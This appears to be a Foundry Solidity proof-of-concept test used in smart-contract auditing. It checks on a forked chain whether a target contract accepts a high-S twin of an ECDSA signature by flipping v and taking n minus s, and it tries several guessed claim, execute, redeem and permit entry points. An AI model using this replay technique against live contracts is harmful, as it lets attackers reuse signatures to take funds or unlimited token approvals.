// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Signature Malleability (Low-S)
/// @notice Detector: signature-malleability. The target uses ecrecover() but
///         does not enforce a low-S value (EIP-2). An attacker can flip the 
///         v-coordinate/s-value to produce a new, valid signature for the same 
///         message, bypassing signature-based replay protection.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The signed entry point is a guess, so
///      several are tried and the result is judged on the OBSERVABLE -- the
///      canonical signature moves the caller's state AND the MUTATED
///      (high-S) signature moves it AGAIN -- never on the bare fact that a
///      call returned.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // secp256k1 group order n (EIP-2 high-S threshold).
    uint256 internal constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    // Test signer -- the target must trust signatures from this key.
    uint256 public constant SIGNER_KEY = 0xA11CE;
    // TODO: the exact message the target expects to be signed.
    bytes32 public constant MESSAGE_HASH = bytes32(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _viewOrZero(string memory sig, address who) internal view returns (uint256) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(sig, who));
        if (ok && ret.length == 32) return abi.decode(ret, (uint256));
        return 0;
    }

    /// A fingerprint of the caller's value-bearing state: ETH plus whichever
    /// common balance view the target exposes. Malleability must move THIS
    /// after the canonical signature has already been consumed.
    function _readState(address who) internal view returns (uint256) {
        uint256 acc = who.balance;
        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("balanceOf(address)", who))));
        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("credits(address)", who))));
        acc = uint256(keccak256(abi.encode(acc, _viewOrZero("balances(address)", who))));
        return acc;
    }

    /// Try one signed entry point and accept it only when the OBSERVABLE
    /// changes, never when the call merely returns: the canonical signature
    /// must move the caller's state, AND the MUTATED signature (same signer,
    /// high-S) must move it AGAIN. A no-op returns successfully and moves
    /// nothing; a target that enforces low-S rejects the mutation.
    function _attempt(
        address attacker,
        uint256 before,
        string memory label,
        bytes memory canonical,
        bytes memory malleable
    ) internal returns (string memory) {
        vm.prank(attacker);
        (bool ok1,) = target.call(canonical);
        if (!ok1) {
            console.log("tried", label, "canonical use reverted");
            return "";
        }
        uint256 mid = _readState(attacker);

        vm.prank(attacker);
        (bool ok2,) = target.call(malleable);
        console.log("tried", label, ok2 ? "malleable use returned" : "malleable use reverted");
        uint256 after_ = _readState(attacker);

        // OBSERVABLE: state moved on the canonical use AND moved AGAIN on the
        // mutated (high-S) signature for the same message.
        if (ok2 && mid != before && after_ != mid) return label;
        return "";
    }

    /// The signed entry point is a GUESS; try the plausible ones.
    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);
        bytes memory sig = abi.encodePacked(r, s, v);

        // The malleable twin: flip v and take n - s. ecrecover returns the
        // SAME signer for it unless the target enforces low-S.
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(SECP256K1_N - uint256(s));
        bytes memory sig2 = abi.encodePacked(r, s2, v2);

        used = _attempt(attacker, before, "claim(bytes)", abi.encodeWithSignature("claim(bytes)", sig), abi.encodeWithSignature("claim(bytes)", sig2));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "execute(bytes)", abi.encodeWithSignature("execute(bytes)", sig), abi.encodeWithSignature("execute(bytes)", sig2));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "redeem(bytes)", abi.encodeWithSignature("redeem(bytes)", sig), abi.encodeWithSignature("redeem(bytes)", sig2));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim(bytes32,bytes)", abi.encodeWithSignature("claim(bytes32,bytes)", MESSAGE_HASH, sig), abi.encodeWithSignature("claim(bytes32,bytes)", MESSAGE_HASH, sig2));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "execute(bytes32,bytes)", abi.encodeWithSignature("execute(bytes32,bytes)", MESSAGE_HASH, sig), abi.encodeWithSignature("execute(bytes32,bytes)", MESSAGE_HASH, sig2));
        if (bytes(used).length > 0) return used;

        bytes memory canonicalPermit = abi.encodeWithSignature(
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            vm.addr(SIGNER_KEY),
            attacker,
            type(uint256).max,
            block.timestamp + 1 days,
            v,
            r,
            s
        );
        bytes memory malleablePermit = abi.encodeWithSignature(
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            vm.addr(SIGNER_KEY),
            attacker,
            type(uint256).max,
            block.timestamp + 1 days,
            v2,
            r,
            s2
        );
        used = _attempt(attacker, before, "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)", canonicalPermit, malleablePermit);
        if (bytes(used).length > 0) return used;

        return "";
    }

    function test_exploit() public {
        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _readState(attackerEOA);
        string memory used = _tryEntry(attackerEOA, before);
        console.log("malleability entry point that accepted a mutated signature:", used);

        assertTrue(
            bytes(used).length > 0,
            "no signature-malleability entry point reproduced. Tried claim(bytes), execute(bytes), redeem(bytes), claim(bytes32,bytes), execute(bytes32,bytes), permit(address,address,uint256,uint256,uint8,bytes32,bytes32), first with a canonical signature then with its high-S twin. This does NOT establish safety: the entry may have another name or signature, the digest/domain may differ from MESSAGE_HASH, or the target may enforce low-S elsewhere."
        );
    }
}
